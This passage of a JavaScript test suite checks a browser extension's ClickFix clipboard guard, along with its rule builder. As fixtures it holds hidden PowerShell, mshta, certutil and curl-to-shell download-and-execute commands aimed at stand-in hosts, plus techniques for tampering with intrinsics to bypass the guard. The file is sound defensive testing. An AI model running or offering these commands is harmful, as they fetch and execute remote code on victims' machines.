// Tests for the 2.3.0 hardening work. Imported by test/run-tests.mjs.
//
// Covers the three things that are easy to regress silently:
//   1. build-rules.mjs must DROP filter options it cannot express, instead of
//      compiling them into a plain block/allow (the pre-2.3.0 bug).
//   2. The CNAME residue must survive its own reduction and carry no domainType.
//   3. clickfix-guard.js must classify real ClickFix payloads as command-shaped
//      and leave ordinary page text alone.
import { readFile } from "node:fs/promises";
import vm from "node:vm";
import { scan } from "./live-region-scan.mjs";

// Load clickfix-guard.js the way the browser does -- as a plain script against a
// window -- and read its real classifier back out. Running the shipped file means
// the assertions below cannot drift from the patterns that actually ship.
// Minimal but behaviourally faithful stand-ins for the platform objects the guard
// patches. Written as a script that runs INSIDE the vm context so every object
// uses that realm's own intrinsics -- mixing host and sandbox intrinsics would
// make cross-realm prototype checks meaningless.
//
// The important detail is that ClipboardItem keeps its data in a closure-side map
// and exposes it through a prototype getter, the way a real platform object keeps
// it in an internal slot. That is what makes it possible to test whether the
// guard reads shadowed own properties or the captured native accessor.
const BOOTSTRAP = `
  globalThis.__probe = { writeText: [], write: [], setData: [], execCommand: [] };
  // The sandbox realm's own intrinsics, so a test can tamper with the same
  // Array.prototype the guard and the stubs actually use.
  globalThis.__realm = { Array, Object, Function, String, Reflect, Promise,
                         RegExp, Boolean, Date };

  globalThis.Blob = function Blob(text) { this.__text = String(text); };
  Blob.prototype.text = function () { return Promise.resolve(this.__text); };

  const ITEM_DATA = new WeakMap();
  globalThis.ClipboardItem = function ClipboardItem(data) { ITEM_DATA.set(this, data); };
  Object.defineProperty(ClipboardItem.prototype, "types", {
    configurable: true,
    get() { return Object.keys(ITEM_DATA.get(this) || {}); }
  });
  ClipboardItem.prototype.getType = function (type) {
    return Promise.resolve(new Blob((ITEM_DATA.get(this) || {})[type]));
  };

  globalThis.Clipboard = function Clipboard() {};
  Clipboard.prototype.writeText = function (text) {
    __probe.writeText.push(text);
    return Promise.resolve();
  };
  Clipboard.prototype.write = function (items) {
    // Emulate WebIDL sequence<ClipboardItem> conversion: iterate via @@iterator,
    // so a redirected iterator would change what this "native" actually sees.
    const out = [];
    for (const item of items) out.push(item);
    __probe.write.push(out);
    return Promise.resolve();
  };

  globalThis.DataTransfer = function DataTransfer() {};
  DataTransfer.prototype.setData = function (format, data) {
    __probe.setData.push({ format, data });
  };

  globalThis.Document = function Document() {};
  Document.prototype.execCommand = function (command) {
    __probe.execCommand.push(command);
    return true;
  };

  // An input shaped like the real thing: its value lives in an internal slot
  // behind a prototype accessor, as in Chromium, so an own property can shadow it
  // for anyone who reads it by name while the "browser" still sees the real text.
  // Without this the guard falls back to reading active.value directly and the
  // shadowing test passes vacuously -- it did, the first time it was written.
  const INPUT_VALUE = new WeakMap();
  globalThis.HTMLInputElement = function HTMLInputElement() {};
  Object.defineProperty(HTMLInputElement.prototype, "value", {
    configurable: true,
    get() {
      // Real WebIDL accessors throw on a receiver without the internal slot, and
      // that throw is how readCopySource recognises the wrong element type. A
      // stub that returns "" instead answers for every object and would make the
      // guard classify empty text for anything focused.
      if (!INPUT_VALUE.has(this)) throw new TypeError("Illegal invocation");
      return INPUT_VALUE.get(this);
    },
    set(v) { INPUT_VALUE.set(this, String(v)); }
  });
  globalThis.__makeInput = function (v) {
    const el = new HTMLInputElement();
    INPUT_VALUE.set(el, v);
    return el;
  };

  navigator.clipboard = new Clipboard();
  Object.setPrototypeOf(document, Document.prototype);
`;

async function loadGuard() {
  const source = await readFile(new URL("../clickfix-guard.js", import.meta.url), "utf8");
  const listeners = {};
  const stubElement = { getAttribute: () => "", className: "", id: "", textContent: "" };
  const context = {
    navigator: {},
    location: { hostname: "test.invalid", href: "https://test.invalid/" },
    console: { warn: () => {}, info: () => {}, error: () => {} }
  };
  context.window = context;          // the guard reads window.* and bare globals
  context.globalThis = context;
  context.document = {
    addEventListener: (type, fn) => { listeners[type] = fn; },
    querySelectorAll: () => [],
    activeElement: null,
    body: null,
    documentElement: stubElement,
    createElement: () => ({ style: {}, setAttribute: () => {}, append: () => {},
      appendChild: () => {}, addEventListener: () => {}, remove: () => {} })
  };
  context.getSelection = () => "";
  context.dispatchEvent = () => true;
  context.CustomEvent = function CustomEvent(type, opts) {
    this.type = type; Object.assign(this, opts);
  };

  vm.createContext(context);
  vm.runInContext(BOOTSTRAP, context, { filename: "bootstrap.js" });
  vm.runInContext(source, context, { filename: "clickfix-guard.js" });
  return {
    internals: context.__abClickfixGuardInternals,
    probe: context.__probe,
    ctx: context,
    listeners,
    // Pretend a trusted click just happened, so policy sees a user gesture.
    click: () => listeners.click?.({ isTrusted: true, target: null }),
    // Run code inside the sandbox realm, so replacing a global binding such as
    // String actually takes effect for name lookups there.
    run: (code) => vm.runInContext(code, context)
  };
}

const results = [];
const check = (name, condition, detail = "") => {
  results.push({ name, ok: Boolean(condition), detail });
};

// --- 1. unsupported options are dropped, not mis-compiled -------------------
// parseList is not exported, so assert on the source contract instead: the
// option set must exist, must be consulted inside the option loop, and must
// contain every option that changes a rule's action.
{
  const src = await readFile(new URL("../build-rules.mjs", import.meta.url), "utf8");
  check("builder declares UNSUPPORTED_ACTION_OPTS",
    /const UNSUPPORTED_ACTION_OPTS = new Set\(/.test(src));
  check("builder drops unsupported options inside the option loop",
    /UNSUPPORTED_ACTION_OPTS\.has\(key\)\)\s*\{\s*dropRule = true/.test(src));
  for (const opt of ["redirect", "redirect-rule", "removeparam", "csp",
                     "elemhide", "generichide", "genericblock"]) {
    const set = /const UNSUPPORTED_ACTION_OPTS = new Set\(\[([\s\S]*?)\]\)/.exec(src);
    check(`"${opt}" is treated as unsupported`, set && set[1].includes(`"${opt}"`));
  }
}

// --- 2. CNAME residue shape -------------------------------------------------
{
  const src = await readFile(new URL("../build-rules.mjs", import.meta.url), "utf8");
  const stage = /Fetching \$\{CNAME_SOURCE\.source\}[\s\S]*?const totalRules/.exec(src);
  check("CNAME stage exists", Boolean(stage));
  if (stage) {
    // Check the emitted rule object, not the surrounding prose: the comment that
    // explains WHY there is no domainType naturally contains the word.
    const push = /cnameRules\.push\(\{([\s\S]*?)\}\);/.exec(stage[0]);
    check("CNAME stage emits a rule object", Boolean(push));
    check("CNAME rules carry no domainType (cloaked hosts are first-party)",
      push && !/domainType\s*:/.test(push[1]));
    check("CNAME rules block on a domain-anchored urlFilter",
      push && /urlFilter: `\|\|\$\{host\}\^`/.test(push[1]));
    check("CNAME rules are prepended so they fall in the enabled index range",
      /\.rules\.unshift\(/.test(stage[0]));
  }

  // The reduction must actually collapse: a parent plus three children becomes
  // one rule, and a child covered by a listed parent is dropped.
  const hosts = [
    "a.tracker.example", "b.tracker.example", "c.tracker.example", // dense parent
    "keep.other.example",
    "parent.example", "child.parent.example"                       // covered child
  ];
  // Re-implement the documented contract to assert the intent is testable.
  const covered = new Set();
  const isCovered = (h) => {
    const parts = h.split(".");
    for (let i = 0; i < parts.length - 1; i += 1) {
      if (covered.has(parts.slice(i).join("."))) return true;
    }
    return false;
  };
  const residue = hosts.filter(h => !isCovered(h));
  const set = new Set(residue);
  const kept = residue.filter(h => {
    const parts = h.split(".");
    for (let i = 1; i < parts.length - 1; i += 1) if (set.has(parts.slice(i).join("."))) return false;
    return true;
  });
  check("a child covered by a listed parent is dropped",
    !kept.includes("child.parent.example"), kept.join(","));
  check("an uncovered host is kept", kept.includes("keep.other.example"));
}

// --- 3. ClickFix payload classification -------------------------------------
// Exercise the guard's own token tables by loading the file and evaluating the
// classifier in isolation, so the test tracks the shipped patterns.
{
  const loaded = await loadGuard();
  const internals = loaded.internals;
  check("guard exposes its classifier for testing", Boolean(internals?.describe && internals?.decide));

  if (internals?.describe) {
    const describe = internals.describe;
    const commandShaped = (p) => p.execution > 0 || p.downloadExec > 0;

    // Representative real-world ClickFix payload shapes.
    const malicious = [
      ['powershell -w hidden -nop -c "iex(new-object net.webclient).downloadstring(\'http://x.tld/a\')"',
       "classic hidden powershell download-exec"],
      ['mshta http://203.0.113.9/v.hta # ✅ "I am not a robot - reCAPTCHA Verification ID: 9f21"',
       "mshta with CAPTCHA lure comment"],
      ['cmd /c nslookup -q=txt verify.attacker.tld', "DNS-staged variant"],
      ['powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAA' +
       'KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==',
       "base64-encoded command"],
      ['certutil -urlcache -split -f http://x.tld/p.exe p.exe', "certutil staging"],
      ['curl -s http://x.tld/s.sh | bash', "curl pipe to shell"]
    ];
    for (const [payload, label] of malicious) {
      const p = describe(payload);
      check(`detects: ${label}`, commandShaped(p),
        `exec=${p.execution} dl=${p.downloadExec} stealth=${p.stealth} lure=${p.lure}`);
    }

    // Decisive-evidence signals the policy can rely on.
    check("CAPTCHA lure wrapper is recognised",
      describe('mshta http://x.tld/a # ✅ I am not a robot - Verification ID: 1').lure > 0);
    check("stealth flags are recognised",
      describe('powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -c 1').stealth > 0);

    // Ordinary text must stay untouched: these are the false positives that
    // would make a user switch the guard off.
    const benign = [
      ["https://example.com/articles/2026/clipboard-security", "a copied URL"],
      ["user@example.com", "an email address"],
      ["4111 1111 1111 1111", "a card number"],
      ["Order #88213 confirmed - thank you!", "order confirmation text"],
      ["git clone https://github.com/example/repo.git", "a git clone command"],
      ["npm install --save-dev vitest", "an npm install line"],
      ["SELECT id, name FROM users WHERE active = true;", "a SQL snippet"],
      ["The quick brown fox jumps over the lazy dog.", "plain prose"]
    ];
    for (const [payload, label] of benign) {
      const p = describe(payload);
      check(`ignores: ${label}`, !commandShaped(p),
        `exec=${p.execution} dl=${p.downloadExec}`);
    }

    // Documented, deliberate ambiguity: a real installer is command-shaped. It
    // must be DETECTED (so policy can decide) but carries no lure/stealth
    // evidence, which is what lets policy treat it differently.
    const installer = describe("irm get.scoop.sh | iex");
    check("legitimate installer is command-shaped but shows no lure/stealth",
      commandShaped(installer) && installer.lure === 0 && installer.stealth === 0,
      `exec=${installer.execution} dl=${installer.downloadExec} ` +
      `stealth=${installer.stealth} lure=${installer.lure}`);

    // --- policy ------------------------------------------------------------
    // decide() is the security/UX trade-off, so pin every branch of it.
    const decide = internals.decide;
    const clicked = { userGesture: true, fromCopyControl: true, host: "test.invalid" };
    const noClick = { userGesture: false, fromCopyControl: false, host: "test.invalid" };
    const verdict = (text, ctx) => decide(describe(text), ctx);

    check("blocks a CAPTCHA-wrapped command even from a click",
      verdict('mshta http://x.tld/a # ✅ I am not a robot - Verification ID: 1', clicked) === "block");
    check("blocks hidden-execution flags even from a click",
      verdict('powershell -WindowStyle Hidden -NoProfile -c "iex(irm http://x.tld/a)"', clicked) === "block");
    check("blocks a page-initiated command with no click behind it",
      verdict("curl -s http://x.tld/s.sh | bash", noClick) === "block");
    check("blocks the DNS-staged variant when page-initiated",
      verdict("cmd /c nslookup -q=txt verify.attacker.tld", noClick) === "block");

    // The case the policy exists to protect: a real installer, clicked, no lure
    // and no stealth. It must reach the clipboard.
    check("allows a clicked installer through (warns, does not block)",
      verdict("irm get.scoop.sh | iex", clicked) === "warn");
    check("allows a clicked curl|sh installer through (warns, does not block)",
      verdict("curl -fsSL https://example.com/install.sh | sh", clicked) === "warn");

    // A spoofed "Copy" label must not buy an attacker anything.
    check("a spoofable copy-control label does not downgrade a block",
      verdict('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"',
        { userGesture: true, fromCopyControl: true, host: "test.invalid" }) === "block");

    // Ordinary text is untouched regardless of provenance.
    for (const ctx of [clicked, noClick]) {
      check("ordinary text is allowed", verdict("Order #88213 confirmed", ctx) === "allow");
    }

    // The false positive this policy deliberately avoids: Cloudflare error pages
    // offer to copy a "Ray ID", which matches a lure token but is not a command.
    // It must not raise the banner.
    check("a copied Cloudflare Ray ID is allowed, not warned",
      verdict("Ray ID: 8f2b19c4a7e30d11", clicked) === "allow");
    check("a copied verification code is allowed, not warned",
      verdict("Verification ID: 44821-AX", clicked) === "allow");
  }

  // The banner must not claim the clipboard was changed when the write was
  // blocked: after a block the clipboard is untouched.
  const guardSrc = await readFile(new URL("../clickfix-guard.js", import.meta.url), "utf8");
  const messages = /const MESSAGES = \{([\s\S]*?)\n  \};/.exec(guardSrc);
  check("banner has separate wording per verdict", Boolean(messages));
  if (messages) {
    check("block wording says the clipboard is unchanged",
      /block:[\s\S]*?clipboard is unchanged/.test(messages[1]));
    check("block wording offers the manual-copy fallback",
      /block:[\s\S]*?copy it yourself/.test(messages[1]));
    check("warn wording says the command IS on the clipboard",
      /warn:[\s\S]*?copied a system command to your clipboard/.test(messages[1]));
  }
  check("banner is selected by verdict", /MESSAGES\[verdict\]/.test(guardSrc));

  // --- bypass resistance (security review follow-up) ------------------------
  // Each check below corresponds to a way a page could have disarmed the guard.
  check("wrappers are locked non-configurable and non-writable",
    /configurable: false, enumerable: false, writable: false/.test(guardSrc));
  check("clipboard is patched on the prototype, not the instance",
    /nativeGetPrototypeOf\(navigator\.clipboard\)/.test(guardSrc) &&
    !/Object\.defineProperty\(clipboard,/.test(guardSrc));

  // --- captured intrinsics -------------------------------------------------
  // The guard's own tooling must not be page-replaceable. Nothing after the
  // capture block may look an intrinsic up by name at call time.
  // An ALLOWLIST, not a denylist. Rounds five and six asserted that six NAMED
  // intrinsics do not appear after the capture block. That test passed while
  //
  //   countMatches = (text, patterns) => patterns.reduce((n, re) => ... re.test(text) ...)
  //
  // sat in the classifier core, where Array.prototype.reduce = () => 0 or
  // RegExp.prototype.test = () => false zeroes every token count and makes
  // decide() return "allow" on all four hook paths at once. A denylist can only
  // catch the names someone already thought of, which is the wrong shape for a
  // blind spot that has now recurred seven times. Every bare call in the live
  // region must be a local or a captured native, and every method call must be
  // on the reviewed list in live-region-scan.mjs.
  const scanned = scan(guardSrc);
  const live = scanned.live;
  check("no call-time global lookups in the live region",
    scanned.bare.length === 0, scanned.bare.join(" "));
  check("no method calls outside the reviewed set in the live region",
    scanned.methods.length === 0, scanned.methods.join(" "));

  // The scan's own controls, in the suite rather than beside it. Three separate
  // tests in this file have passed with the fix removed; a source scan that
  // quietly stops seeing part of the file is the same failure with no symptom,
  // and an earlier regex-based version of this scanner did exactly that -- a "/"
  // in comment prose opened a phantom regex literal that swallowed the next
  // three function declarations.
  const ANCHOR = "  const countMatches = (text, patterns) => {";
  check("the live-region scan reads the whole region",
    guardSrc.includes(ANCHOR) &&
    /(?:const|function)\s+intercept\b/.test(live) &&
    /(?:const|function)\s+showWarning\b/.test(live) &&
    /(?:const|function)\s+readCopySource\b/.test(live),
    "declarations missing from the scanned region");
  check("the live-region scan flags an injected global lookup", (() => {
    const dirty = guardSrc.replace(ANCHOR,
      "  const sniff = (x) => Boolean(x.reduce((a) => a, 0));\n" + ANCHOR);
    const r = scan(dirty);
    return r.bare.includes("Boolean") && r.methods.includes("reduce");
  })());
  check("the live-region scan ignores comments, strings and regex literals", (() => {
    const dirty = guardSrc.replace(ANCHOR,
      "  // trailing note mentioning x.reduce() and Boolean(y)\n" +
      '  const s1 = "x.reduce() Boolean(y)";\n' +
      "  const s2 = /x\\.reduce\\(\\)/i;\n" + ANCHOR);
    const r = scan(dirty);
    // Compare against the baseline, not against zero: asserting zero made this
    // check fail spuriously in every control run where the guard already had a
    // real violation, which is a misleading signal from a test about noise.
    return r.bare.length === scanned.bare.length &&
      r.methods.length === scanned.methods.length;
  })());
  check("forwarding uses a captured Reflect.apply", /nativeApply\(native, this/.test(guardSrc));
  check("the promise constructor and then are captured", /const NativePromise = Promise;/.test(guardSrc) &&
    /const nativeThen = Promise\.prototype\.then;/.test(guardSrc));
  check("the guard never awaits a page-reachable promise",
    !/\bawait\b|\basync\b/.test(live),
    (live.match(/\bawait\b|\basync\b/) || [""])[0]);
  check("every promise the guard consumes goes through the captured then",
    !/[^,\s]\.then\(/.test(live) && /nativeApply\(nativeThen,/.test(guardSrc),
    (live.match(/[^,\s]\.then\(/) || [""])[0]);
  // Both nativeThen call sites must fail closed, so count them: reverting either
  // one leaves the other matching and would pass a mere presence test.
  check("every captured-then call site fails closed on a throw",
    (guardSrc.match(/catch \{ return tamper\(\); \}/g) || []).length ===
    (guardSrc.match(/nativeApply\(nativeThen, (?:blobPromise|textPromise)/g) || []).length &&
    /const tamper = \(\) => \{/.test(guardSrc),
    `${(guardSrc.match(/catch \{ return tamper\(\); \}/g) || []).length} tamper catch(es) for ` +
    `${(guardSrc.match(/nativeApply\(nativeThen, (?:blobPromise|textPromise)/g) || []).length} consumed promise(s)`);
  check("execCommand forwards the coerced command, not the original object",
    /const args = \[cmd\];/.test(guardSrc) &&
    !/\[command, \.\.\.rest\]/.test(guardSrc));
  check("coercion is type-checked, not assumed to return a string",
    /typeof out === "string" \? out : null/.test(guardSrc));
  check("sealSequence verifies its own descriptor", /d\.writable \|\| d\.configurable/.test(guardSrc));
  check("an unsealable sequence fails closed", /list === null \|\| !nativeIsArray\(list\)/.test(guardSrc));
  check("Symbol.iterator is documented as uncapturable-by-design",
    /cannot be replaced/.test(guardSrc));
  check("execCommand is patched on Document.prototype",
    /Document\.prototype/.test(guardSrc) &&
    !/Object\.defineProperty\(document, "execCommand"/.test(guardSrc));
  check("untrusted synthetic clicks cannot forge a user gesture",
    /if \(!event\.isTrusted\) return;/.test(guardSrc));
  check("navigator.userActivation is reported but not used as a veto",
    /navigator\.userActivation/.test(guardSrc) &&
    /browserActivation: browserSaysActivated\(\)/.test(guardSrc) &&
    !/activated !== false/.test(guardSrc));
  check("clipboard writes are caught at DataTransfer.setData, not only on copy",
    /DataTransfer\.prototype, "setData"/.test(guardSrc));
  check("native functions are reached through a closure, not a public property",
    /native\.call\(this/.test(guardSrc));

  // --- behavioural: exercise the installed wrappers -------------------------
  // These drive the real wrappers against the platform stubs, so they test what
  // the guard DOES, not how it is written.
  const { probe, ctx, click, run } = loaded;
  const clipboard = ctx.navigator.clipboard;

  check("writeText wrapper is installed on the prototype",
    ctx.Clipboard.prototype.writeText.name === "writeText" && probe.writeText.length === 0);

  // TOCTOU: an argument whose toString() changes between calls. The guard must
  // coerce once and forward that same primitive, so the native can never see a
  // value the classifier did not inspect.
  {
    let n = 0;
    const shifty = { toString: () => (n++ ? "powershell -w hidden -nop -c calc" : "hello") };
    click();
    await clipboard.writeText(shifty);
    const received = probe.writeText[probe.writeText.length - 1];
    check("writeText coerces its argument exactly once (no TOCTOU)",
      typeof received === "string" && received === "hello",
      `native received ${typeof received}: ${String(received).slice(0, 40)}`);
    check("a mutating toString cannot smuggle a payload past the classifier",
      !/powershell/i.test(String(received)));
  }

  // The same trick with the payload first must be blocked outright.
  {
    const before = probe.writeText.length;
    click();
    await clipboard.writeText({
      toString: () => 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
    });
    check("a stealth payload via toString is blocked before the native call",
      probe.writeText.length === before);
  }

  // Ordinary text still reaches the clipboard, as a string.
  {
    click();
    await clipboard.writeText("just some copied prose");
    check("ordinary text still reaches the native writeText",
      probe.writeText[probe.writeText.length - 1] === "just some copied prose");
  }

  // Shadowed `types`: a page hides the text flavour with an own property while
  // the real data stays in the internal slot. The guard must read the captured
  // native accessor and still see the payload.
  {
    const before = probe.write.length;
    const item = new ctx.ClipboardItem({ "text/plain": "mshta http://x.tld/a # ✅ I am not a robot" });
    Object.defineProperty(item, "types", { value: [], configurable: true });
    click();
    await clipboard.write([item]);
    check("a shadowed types getter cannot hide a payload from clipboard.write",
      probe.write.length === before,
      `native write called ${probe.write.length - before} time(s)`);
  }

  // A re-iterating iterable: yields a harmless item on the first pass and a
  // payload on the second. The guard must snapshot once, so the native can only
  // ever receive the pass the classifier actually inspected.
  {
    const before = probe.write.length;
    const benign = new ctx.ClipboardItem({ "text/plain": "hello there" });
    const payload = new ctx.ClipboardItem({
      "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
    });
    let pass = 0;
    const shiftyList = {
      [Symbol.iterator]() {
        const items = pass++ === 0 ? [benign] : [payload];
        let i = 0;
        return { next: () => (i < items.length
          ? { value: items[i++], done: false }
          : { value: undefined, done: true }) };
      }
    };
    click();
    await clipboard.write(shiftyList);
    const forwarded = probe.write[probe.write.length - 1];
    check("clipboard.write snapshots its iterable exactly once",
      probe.write.length === before + 1 && Array.isArray(forwarded) && forwarded.length === 1,
      `forwarded ${probe.write.length - before} call(s)`);
    check("a re-iterating iterable cannot swap in a payload after classification",
      forwarded && forwarded[0] === benign, "native received a different item than was classified");
  }

  // A replaced Array.prototype[Symbol.iterator] must not redirect the native's
  // view of the snapshot. Without the own iterator on the snapshot this fails:
  // the guard classifies the first yield and the native iterates the second.
  {
    const before = probe.write.length;
    const benign = new ctx.ClipboardItem({ "text/plain": "harmless text" });
    const payload = new ctx.ClipboardItem({
      "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
    });
    let pass = 0;
    const realm = ctx.__realm.Array;
    const realIter = realm.prototype[Symbol.iterator];
    realm.prototype[Symbol.iterator] = function () {
      const which = pass++ === 0 ? [benign] : [payload];
      let i = 0;
      return { next: () => (i < which.length
        ? { value: which[i++], done: false }
        : { value: undefined, done: true }) };
    };
    try {
      click();
      // Build the input INSIDE the sandbox realm: an array literal here would
      // carry Node's Array.prototype, so tampering the sandbox's prototype
      // would not apply to it and this test would pass vacuously.
      await clipboard.write(realm.of(benign));
    } finally {
      realm.prototype[Symbol.iterator] = realIter;
    }
    const forwarded = probe.write[probe.write.length - 1];
    check("a replaced Array.prototype iterator cannot redirect the native's view",
      probe.write.length === before + 1 && forwarded?.length === 1 && forwarded[0] === benign,
      "native iterated an item the classifier never inspected");
  }

  // --- behavioural: the guard's own tooling must be untamperable ----------
  // Each of these replaces an intrinsic the guard uses, AFTER it has loaded and
  // captured its references. A guard that looked them up at call time would be
  // routed through page code by any one of them.
  {
    const R = ctx.__realm;

    // Function.prototype.call: would hijack every native.call(this, v) forward.
    {
      const realCall = R.Function.prototype.call;
      let hijacked = 0;
      R.Function.prototype.call = function (...args) {
        hijacked += 1;
        return realCall.apply(this, args);
      };
      let received;
      try {
        click();
        await clipboard.writeText("plain text via tampered call");
        received = probe.writeText[probe.writeText.length - 1];
      } finally {
        R.Function.prototype.call = realCall;
      }
      check("a replaced Function.prototype.call cannot intercept forwarding",
        received === "plain text via tampered call" && hijacked === 0,
        `hijacked ${hijacked} call(s), native got ${JSON.stringify(received)}`);
    }

    // String: a replacement returning an OBJECT would be stringified to something
    // benign by the classifier and re-coerced to the payload by the binding.
    {
      loaded.run(`
        globalThis.__realString = String;
        globalThis.__n = 0;
        globalThis.String = function (v) {
          if (v && v.__bait) {
            return { toString: () => (__n++ ? "powershell -w hidden -nop -c calc" : "hello") };
          }
          return __realString(v);
        };
      `);
      let received;
      try {
        click();
        await clipboard.writeText({ __bait: true, toString: () => "real value" });
        received = probe.writeText[probe.writeText.length - 1];
      } finally {
        loaded.run("globalThis.String = __realString;");
      }
      check("a replaced String cannot smuggle an object past the classifier",
        typeof received === "string" && !/powershell/i.test(received),
        `native got ${typeof received}: ${String(received).slice(0, 40)}`);
    }

    // Object.defineProperty replaced with a silent no-op. Because the guard
    // captured it before page script ran, the replacement is simply inert: the
    // seal still succeeds, so a payload is still caught and a benign item is
    // still forwarded. (The fail-closed branch for a seal that cannot be
    // VERIFIED is asserted from the source above; it is unreachable here because
    // the snapshot is a fresh array the guard owns.)
    {
      const realDefine = R.Object.defineProperty;
      R.Object.defineProperty = function () { /* silently does nothing */ };
      let blockedPayload = false;
      let forwardedBenign = false;
      try {
        const payloadBefore = probe.write.length;
        click();
        await clipboard.write(R.Array.of(new ctx.ClipboardItem({
          "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
        })));
        blockedPayload = probe.write.length === payloadBefore;

        const benignBefore = probe.write.length;
        click();
        await clipboard.write(R.Array.of(new ctx.ClipboardItem({ "text/plain": "hi" })));
        forwardedBenign = probe.write.length === benignBefore + 1;
      } finally {
        R.Object.defineProperty = realDefine;
      }
      check("a replaced Object.defineProperty is inert: payload still blocked",
        blockedPayload);
      check("a replaced Object.defineProperty is inert: benign still forwarded",
        forwardedBenign);
    }

    // --- round 7: the classifier's own text processing ------------------
    // These are the worst bypasses found in this file. Each is ONE assignment,
    // needs no timing trick, and disarms all four hook paths at once by zeroing
    // every token count, so decide() returns "allow".
    {
      const cases = [
        ["Array.prototype.reduce", R.Array.prototype, "reduce", function () { return 0; }],
        ["RegExp.prototype.test", R.RegExp.prototype, "test", function () { return false; }],
        ["String.prototype.split", R.String.prototype, "split", function () { return []; }]
      ];
      for (let i = 0; i < cases.length; i += 1) {
        const label = cases[i][0], holder = cases[i][1], name = cases[i][2];
        const before = probe.writeText.length;
        const real = holder[name];
        holder[name] = cases[i][3];
        try {
          click();
          await clipboard.writeText('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
        } finally { holder[name] = real; }
        check(`a replaced ${label} cannot zero the classifier`,
          probe.writeText.length === before,
          `native received ${JSON.stringify(probe.writeText[probe.writeText.length - 1])}`);
      }
    }

    // Boolean is a page-replaceable GLOBAL, and clipboard.write used it to decide
    // whether an item carried text. Boolean = () => false made that false for
    // every item, so the sequence was forwarded unclassified.
    {
      const before = probe.write.length;
      run("globalThis.Boolean = function () { return false; };");
      try {
        click();
        await clipboard.write(R.Array.of(new ctx.ClipboardItem({
          "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
        })));
      } finally { run("globalThis.Boolean = __realm.Boolean;"); }
      check("a replaced Boolean cannot make an item look text-free",
        probe.write.length === before,
        `forwarded ${probe.write.length - before} write(s) unclassified`);
    }

    // Date.now decides whether a click counts as a user gesture, and a forged
    // gesture turns the command-shaped verdict from "block" into "warn", which
    // forwards. This payload is command-shaped but carries no stealth or lure
    // token, so the gesture is the ONLY thing between block and warn.
    {
      // A FRESH guard: this suite shares one loaded instance, and an earlier
      // click() leaves the real gesture window open, in which case the payload is
      // correctly only warned about and forwarded. Asserting a block against a
      // genuinely-recent click tests nothing about Date.now.
      const fresh = await loadGuard();
      const freshRealm = fresh.ctx.__realm;
      const realNow = freshRealm.Date.now;
      // Near zero, not far in the future: the window is
      // Date.now() - lastClickAt < 1500 and lastClickAt starts at 0, so a large
      // constant makes the delta enormous and no gesture is seen. The first
      // version of this test used 1e12 and therefore could not fail.
      freshRealm.Date.now = function () { return 0; };
      try {
        // No click() on this instance, so nothing was ever activated.
        await fresh.ctx.navigator.clipboard.writeText(
          "curl -fsSL https://example.com/install.sh | sh");
      } finally { freshRealm.Date.now = realNow; }
      check("a replaced Date.now cannot forge the user gesture",
        fresh.probe.writeText.length === 0,
        `native received ${JSON.stringify(fresh.probe.writeText[0])}`);
    }

    // execCommand("copy") read activeElement.value by NAME, so an own property
    // shadowed the real getter: the guard classified the page's string while the
    // browser copied the live selection from internal slots.
    {
      const before = probe.execCommand.length;
      const input = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
      R.Object.defineProperty(input, "value", { get() { return "harmless text"; } });
      ctx.document.activeElement = input;
      click();
      const ret = ctx.document.execCommand("copy");
      ctx.document.activeElement = null;
      check("an own value getter cannot hide what execCommand will copy",
        ret === false && probe.execCommand.length === before,
        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
    }

    // The same read, attacked at the prototype instead of the instance.
    {
      const before = probe.execCommand.length;
      const input = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
      const realDesc = R.Object.getOwnPropertyDescriptor(ctx.HTMLInputElement.prototype, "value");
      R.Object.defineProperty(ctx.HTMLInputElement.prototype, "value", {
        configurable: true, get() { return "harmless text"; }
      });
      let ret;
      try {
        ctx.document.activeElement = input;
        click();
        ret = ctx.document.execCommand("copy");
      } finally {
        R.Object.defineProperty(ctx.HTMLInputElement.prototype, "value", realDesc);
        ctx.document.activeElement = null;
      }
      check("a replaced input value getter cannot hide what execCommand will copy",
        ret === false && probe.execCommand.length === before,
        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
    }

    // A replaced toLowerCase made the guard decide the command was not "copy".
    {
      const before = probe.execCommand.length;
      const real = R.String.prototype.toLowerCase;
      R.String.prototype.toLowerCase = function () { return "notcopy"; };
      let ret;
      try {
        ctx.document.activeElement = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
        click();
        ret = ctx.document.execCommand("copy");
      } finally {
        R.String.prototype.toLowerCase = real;
        ctx.document.activeElement = null;
      }
      check("a replaced toLowerCase cannot make a copy look like another command",
        ret === false && probe.execCommand.length === before,
        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
    }

    // A hostile activeElement getter. Reading the copy source is the one step that
    // genuinely can throw on a page's terms, and the old copy branch answered a
    // throw by falling through to the native. For a copy command a throw is
    // anomalous, so it must refuse instead.
    {
      const before = probe.execCommand.length;
      const realDesc = R.Object.getOwnPropertyDescriptor(ctx.document, "activeElement");
      R.Object.defineProperty(ctx.document, "activeElement", {
        configurable: true,
        get() { throw new Error("hostile activeElement"); }
      });
      let ret;
      try {
        click();
        ret = ctx.document.execCommand("copy");
      } finally {
        if (realDesc) R.Object.defineProperty(ctx.document, "activeElement", realDesc);
        else {
          delete ctx.document.activeElement;
          ctx.document.activeElement = null;
        }
      }
      check("a throwing activeElement getter makes the copy fail closed",
        ret === false && probe.execCommand.length === before,
        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
    }

    // Promise interception. `await p` on a page-reachable promise is NOT a plain
    // read of p's internal slots: it performs PromiseResolve(%Promise%, p), which
    // does Get(p, "constructor") and only short-circuits when that is the
    // intrinsic. Replace it and p is treated as a thenable, so Get(p, "then")
